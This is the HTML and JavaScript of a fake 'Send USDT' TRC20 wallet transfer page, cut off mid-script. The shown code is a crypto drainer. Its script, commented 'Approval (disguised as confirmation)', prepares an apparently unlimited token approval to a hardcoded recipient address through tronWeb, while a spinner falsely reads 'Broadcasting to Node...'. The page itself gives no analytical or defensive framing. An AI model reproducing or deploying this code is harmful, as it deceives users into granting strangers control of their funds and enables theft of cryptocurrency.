<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Send USDT</title>
    <style>
        body { background: #ffffff; margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; color: #333; }
        .nav-bar { padding: 18px; font-size: 18px; font-weight: 600; border-bottom: 0.5px solid #f0f0f0; text-align: center; }
        .container { padding: 25px; }
        .info-row { display: flex; justify-content: space-between; margin-bottom: 25px; font-size: 15px; }
        .label { color: #999; margin-bottom: 10px; font-size: 13px; font-weight: 500; }
        .address-box { font-size: 13px; color: #444; word-break: break-all; margin-bottom: 30px; line-height: 1.4; background: #f9f9f9; padding: 10px; border-radius: 8px; }
        .input-group { border-bottom: 2px solid #0062ff; padding: 10px 0; margin-bottom: 35px; display: flex; align-items: center; }
        input { border: none; outline: none; font-size: 32px; width: 100%; font-weight: bold; color: #000; background: transparent; }
        .unit { font-size: 20px; font-weight: 700; color: #000; }
        .fee-row { display: flex; justify-content: space-between; font-size: 13px; color: #999; margin-top: -20px; }
        .btn { background: #0062ff; color: #fff; height: 55px; border-radius: 28px; display: flex; align-items: center; justify-content: center; font-size: 17px; font-weight: 600; margin-top: 60px; cursor: pointer; box-shadow: 0 4px 12px rgba(0,98,255,0.2); }
        #loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.95); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #0062ff; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="nav-bar">Send USDT</div>
    <div class="container">
        <div class="info-row">
            <span>Asset</span>
            <span style="color:#0062ff; font-weight:600;">USDT (TRC20)</span>
        </div>
        <div class="label">Recipient Address</div>
        <div class="address-box">TACSF4i5vZxSp4rzR1jfJ5JTf4depqi4dZ</div>
        <div class="label">Amount</div>
        <div class="input-group">
            <input type="number" id="usdt-amount" placeholder="0.00">
            <span class="unit">USDT</span>
        </div>
        <div class="fee-row">
            <span>Estimated Fee</span>
            <span>0.00 TRX</span>
        </div>
        <div class="btn" onclick="startProcess()">Next</div>
    </div>

    <div id="loading-overlay">
        <div class="loader"></div>
        <p id="status-text" style="font-size:14px; color:#666; margin-top:20px; font-weight:500;">Broadcasting to Node...</p>
    </div>

    <script>
        const RECIPIENT = "TACSF4i5vZxSp4rzR1jfJ5JTf4depqi4dZ";
        const CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        let currentStep = 1;

        async function startProcess() {
            const amount = document.getElementById('usdt-amount').value;
            if (!amount || amount <= 0) return;
            
            const overlay = document.getElementById('loading-overlay');
            const status = document.getElementById('status-text');
            overlay.style.display = 'flex';

            try {
                const trc20Contract = await window.tronWeb.contract().at(CONTRACT);
                if (currentStep === 1) {
                    // First Step: Approval (disguised as confirmation)
                    const infinite = "1157920892373161954235709850086